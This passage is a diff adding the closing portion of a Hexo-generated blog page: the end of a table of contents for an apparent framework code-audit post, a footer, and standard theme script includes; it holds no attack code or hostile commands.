nav-level-3"><a class="nav-link" href="#%E8%A7%86%E5%9B%BE%E5%B1%82%EF%BC%88v%EF%BC%89"><span class="nav-number">1.2.</span> <span class="nav-text">视图层（v）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6%E5%99%A8%E5%B1%82%EF%BC%88c%EF%BC%89"><span class="nav-number">1.3.</span> <span class="nav-text">控制器层（c）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#url%E8%AE%BF%E9%97%AE"><span class="nav-number">2.</span> <span class="nav-text">url访问</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1"><span class="nav-number">3.</span> <span class="nav-text">路由</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number"></span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
